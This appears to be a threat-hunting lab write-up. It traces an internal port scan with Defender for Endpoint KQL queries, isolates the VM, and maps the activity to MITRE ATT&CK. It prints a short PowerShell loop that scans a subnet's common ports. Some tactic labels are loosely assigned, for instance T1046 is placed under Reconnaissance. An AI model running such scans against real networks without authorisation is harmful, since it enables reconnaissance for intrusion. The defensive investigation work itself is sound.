To confirm the origin of this suspicious activity, I pivoted to the DeviceProcessEvents table to look for the process responsible for initiating these connections. By focusing on a specific time window surrounding the detected network anomalies, I aimed to identify any executable or script that matched the port scanning behavior.

### KQL â Correlate Process Activity around the Port Scan Time
-------------------------------------------------------
kql
let VMName = "samson-windows-";
let specificTime = datetime(2025-10-12T13:15:03.9576325Z);
DeviceProcessEvents
| where Timestamp between ((specificTime - 10m) .. (specificTime + 10m))
| where DeviceName == VMName
| order by Timestamp desc
| project Timestamp, FileName, InitiatingProcessCommandLine
-------------------------------------------------------

The query output revealed that a PowerShell script named portscan.ps1 had been executed under the System account. This was a significant finding because the System account generally has administrative-level privileges and is not typically used to execute network scanning scripts.

Upon logging into the VM, I located the file in C:\ProgramData\portscan.ps1 and reviewed its contents. The script was intentionally scanning hosts in the subnet, sequentially testing common ports. This confirmed that the slowdown was caused by repeated internal scanning initiated by the PowerShell script.

### Snippet of the observed PowerShell script:
-------------------------------------------------------
powershell
for ($i=4; $i -le 10; $i++) {
   Test-NetConnection "10.0.0.$i" -Port 21,23,25,53,80,110,443
}
-------------------------------------------------------

Since the script was running under the System account and not triggered by an identifiable user, I concluded that the activity was automated and potentially malicious. I proceeded to isolate the samson-windows- VM from the network using Defender for Endpoint's built-in Isolate Device feature.

After isolating the system, I ran a full malware scan to check for persistence mechanisms or additional payloads. The scan returned clean, but ideally you are to request a full rebuild of the VM. In a production setting, this step ensures that any potential hidden or dormant artifacts are fully removed.

<InlineGallery images={port-scan-investigation-isolation} title="Port Scan Investigation and Device Isolation Process" />

## Response and MITRE ATT&CK Mapping

This scenario corresponded with several techniques in the MITRE ATT&CK Framework, helping align the observed activity with recognized adversarial tactics:

1. **Reconnaissance (T1046 â Network Service Scanning)**: The port scanning activity represented a clear attempt to enumerate open services.
2. **Execution (T1059.001 â PowerShell)**: The PowerShell script was used as the execution medium for network probing.
3. **Privilege Escalation (T1078 â Valid Accounts / System Context)**: The script ran under the System account, suggesting a high privilege level.
4. **Lateral Movement (T1021 â Remote Services)**: The scanning pattern indicated attempts to discover reachable hosts for potential lateral movement.

By isolating the device, scanning for malware, and scheduling a reimage, the risk of any further impact was neutralized.

## Documentation

Throughout the course of this investigation, I documented every major step and observation to ensure a clear understanding of how the event unfolded. The investigation began with an initial hypothesis of possible internal misuse, which evolved into the discovery of systematic port scanning. Each query used in Defender for Endpoint was recorded alongside its findings to form an evidence trail.

This documentation not only captured the technical steps taken, such as verifying logs, pivoting between tables, and confirming the script execution but also reflected the reasoning behind each action. Maintaining detailed documentation like this allows for transparency, consistency, and reproducibility in future hunts. It also helps build reference material that can be used by other analysts for similar incidents, ensuring the organization's knowledge base grows with every investigation.

## Improvement

After analyzing the entire scenario, several improvement points were identified. First, it became clear that PowerShell execution policies were too relaxed in this environment. Restricting PowerShell to only run signed scripts would immediately reduce the risk of arbitrary script execution.

Second, the internal network lacked segmentation, allowing one compromised host to communicate freely with all others. In a real corporate setup, proper network segmentation would ensure that unnecessary east-west traffic is limited and monitored.

Third, implementing automated alerting for abnormal internal traffic patterns, such as repeated connection failures to sequential ports, would enable the SOC team to detect similar behavior earlier. Additionally, conducting proactive threat hunts on a routine basis helps catch reconnaissance activities before they evolve into actual compromise events.

Ultimately, this scenario reinforced the importance of combining technical detection with procedural discipline, ensuring every hunt improves the overall security posture of the environment.

## Conclusion

The sudden network slowdown was traced to a PowerShell-based port scanning script executed under the System account on samson-windows-. Although no active compromise was found, the activity realistically simulated how internal reconnaissance could degrade performance and increase exposure within an unrestricted network.

This hunt demonstrated the power of Microsoft Defender for Endpoint in identifying behavioral anomalies, correlating telemetry across different data sources, and facilitating immediate containment actions.

Through structured investigation and methodical documentation, this exercise emphasized how internal misconfigurations or unauthorized automation can lead to observable network symptoms, and how disciplined threat hunting can quickly uncover their root cause.
